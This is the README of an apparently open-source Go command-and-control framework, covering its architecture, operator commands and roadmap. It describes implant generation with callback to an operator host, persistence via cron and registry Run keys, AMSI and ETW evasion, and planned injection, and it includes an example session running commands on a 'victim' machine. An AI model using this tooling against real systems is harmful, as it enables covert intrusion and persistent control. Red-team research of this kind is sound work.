# NullBeacon C2

[![Build](https://github.com/RodKast/NullBeacon/actions/workflows/go.yml/badge.svg)](https://github.com/RodKast/NullBeacon/actions/workflows/go.yml)
[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go&logoColor=white)](https://golang.org)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey?style=flat)](https://github.com/RodKast/NullBeacon)
[![License](https://img.shields.io/badge/license-GPL%20v3-blue?style=flat)](LICENSE)
[![Status](https://img.shields.io/badge/status-active%20development-orange?style=flat)](https://github.com/RodKast/NullBeacon)

> **NullBeacon** is a modular, beacon-based Command & Control framework written in Go — built for authorized security research, CTF competitions, and home lab red team operations.

---

> ⚠️ **Authorized use only.** This tool is intended for legal security testing on systems you own or have explicit written permission to test. Misuse is strictly prohibited.

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Operator Reference](#operator-reference)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [License](#license)

---

## Overview

NullBeacon implements a **beacon-based C2 model** — agents check in at randomized intervals (jittered sleep), receive queued tasks, execute them on the target, and return output to the operator. All communication is encrypted over TLS.

The framework is designed around the principle of **separation of concerns** — listeners, agents, tasks, and the operator shell are all independent components that can be extended without modifying core logic.

---

## Architecture

```
Operator Terminal
       │
       ▼
 ┌─────────────────────────────┐
 │      NullBeacon Teamserver  │
 │                             │
 │  ┌─────────────────────┐   │
 │  │   Listener Manager  │   │
 │  │  TLS  :port ◄───────┼───┼──── Agent beacon (encrypted)
 │  │  HTTPS :443 (soon)  │   │
 │  └─────────────────────┘   │
 │                             │
 │  Agent Registry             │
 │  Task Queue                 │
 │  teamserver.log             │
 └─────────────────────────────┘
```

| Component | Description |
|---|---|
| `teamserver` | Core server — manages listeners, agents, and tasks |
| `listener` | Pluggable TLS listener (HTTPS upcoming) |
| `agent` | Implant — beacons home, executes tasks, returns output |
| `generate.go` | Cross-compiles agents for Linux and Windows |
| `tls.go` | Generates self-signed TLS certificates at runtime |

---

## Features

| Category | Details |
|---|---|
| **Transport** | TLS-only — all C2 traffic encrypted by default |
| **Listeners** | Dynamic start/stop/list, context-based cancellation |
| **Agents** | UUID registration, returning beacon detection, last seen tracking |
| **Tasks** | Per-agent queue, delivered on next beacon, output returned automatically |
| **Generation** | Cross-compile for Linux/Windows, random codename filenames, debug symbols stripped |
| **Persistence** | Linux cron `@reboot` · Windows registry `Run` key |
| **Evasion** | AMSI patch · ETW stub (Windows) |
| **OPSEC** | Sleep jitter (8–12s) · stripped symbols · TLS encryption |
| **Operator UX** | readline shell · colored output · agent notifications · help menu |

---

## Project Structure

```
NullBeacon/
├── cmd/
│   ├── teamserver/
│   │   ├── main.go             # Entry point, banner, operator shell
│   │   ├── handlers.go         # Agent connection and task delivery
│   │   ├── listeners.go        # Listener start/stop/list
│   │   ├── agents.go           # Agent list, interact shell, remove
│   │   ├── generate.go         # Agent binary generation
│   │   ├── tls.go              # TLS certificate generation
│   │   └── help.go             # Help menu
│   └── agent/
│       ├── main.go             # Beacon loop, task execution
│       ├── persist_linux.go    # Linux persistence (cron)
│       ├── persist_windows.go  # Windows persistence (registry)
│       ├── persist_other.go    # Stub for other platforms
│       ├── evasion_windows.go  # AMSI + ETW patching
│       └── evasion_other.go    # Stub for other platforms
├── pkg/
│   ├── agent/                  # Agent struct and registration
│   ├── listener/               # Listener struct with StartTLS
│   └── task/                   # Task struct and status tracking
├── .github/
│   └── workflows/
│       └── go.yml              # CI — build and test on push
├── go.mod
├── go.sum
└── teamserver.log              # Runtime log (gitignored)
```

---

## Installation

**Requirements:** Go 1.21+

```bash
git clone https://github.com/RodKast/NullBeacon.git
cd NullBeacon
go mod tidy
go build ./...
```

---

## Quick Start

**1. Start the teamserver**

```bash
go run ./cmd/teamserver
```

**2. Start a TLS listener**

```
nullbeacon> listen --lhost 0.0.0.0 --lport 8443
```

**3. Generate an agent**

```
nullbeacon> generate --os linux --arch amd64 --lhost <your_ip> --lport 8443
```

**4. Deploy and execute the agent on the target machine**

**5. Interact with the connected agent**

```
nullbeacon> list
nullbeacon> interact <agentID>
[agent:3f9a1b2c]> whoami
output: victim
```

> Logs are written to `teamserver.log`. Monitor with `tail -f teamserver.log`.

---

## Operator Reference

### Listeners

| Command | Description |
|---|---|
| `listen --lhost <host> --lport <port>` | Start a TLS listener |
| `listeners` | List all active listeners |
| `stop <listenerID>` | Stop a listener |

### Agents

| Command | Description |
|---|---|
| `list` | List connected agents with last seen timestamp |
| `interact <agentID>` | Enter the agent shell |
| `remove <agentID>` | Remove a dead agent from the registry |
| `generate --os <os> --arch <arch> --lhost <ip> --lport <port>` | Cross-compile and generate an agent binary |

### Agent Shell

| Command | Description |
|---|---|
| `<command>` | Queue a shell command and wait for output |
| `tasks` | List all queued and completed tasks |
| `back` | Return to the main shell |

### General

| Command | Description |
|---|---|
| `help` | Display the help menu |
| `exit` | Exit NullBeacon |

---

## Example Session

```
nullbeacon> listen --lhost 0.0.0.0 --lport 8443
[+] started listener a1b2c3d4 on 0.0.0.0:8443

nullbeacon> generate --os linux --arch amd64 --lhost 10.0.0.1 --lport 8443
[*] generating linux/amd64 agent...
[+] agent saved: /home/operator/GHOST_COBRA.elf (ID: 3f9a1b2c)

nullbeacon> [+] new agent connected: victim@target-pc (3f9a1b2c)

nullbeacon> list
ID: 3f9a1b2c  victim@target-pc  10.0.0.5:51234  Last Seen: 2026-06-22 10:14:02

nullbeacon> interact 3f9a1b2c
[agent:3f9a1b2c]> whoami
[*] task queued — waiting for output...
output: victim

[agent:3f9a1b2c]> tasks
[3f9a1b2c] whoami → completed: victim

[agent:3f9a1b2c]> back

nullbeacon> stop a1b2c3d4
[+] stopped listener a1b2c3d4

nullbeacon> exit
```

---

## Roadmap

### Completed
- [x] Stage 1–7 — Core framework (teamserver, agent, beacon loop, task queue)
- [x] Stage 7.5–7.8 — Operator CLI, dynamic listeners, agent generation
- [x] Stage 7.9–7.12 — Reliability, UX, OPSEC hardening, TLS transport
- [x] Stage 8 — Persistence (Linux cron, Windows registry)
- [x] Stage 9 — Evasion (AMSI patch, ETW stub)

### In Progress
- [ ] Stage 10 — Packing (AES payload encryption, custom loaders)

### Planned
- [ ] Stage 11 — Transport hardening (HTTPS listener, malleable profiles)
- [ ] Stage 12 — Process injection
- [ ] Stage 13 — Living off the Land (LOLBins)
- [ ] Stage 14 — Malleable C2 profiles
- [ ] Stage 15 — Syscall obfuscation
- [ ] Stage 16 — In-memory execution

### Release v0.1.0
- [ ] Install script — one-liner install to `/usr/local/bin`
- [ ] GitHub Actions release pipeline — auto-build on version tag
- [ ] Pre-compiled Linux binary on GitHub Releases

---

## Contributing

Contributions and feedback are welcome. Open an issue or pull request on GitHub.

---

## License

GPL v3 — see [LICENSE](LICENSE) for details.

---

## Disclaimer

NullBeacon is developed strictly for **educational purposes**, **CTF competitions**, and **authorized security research**. The authors assume no liability for misuse. Always obtain explicit written permission before testing against any system you do not own.
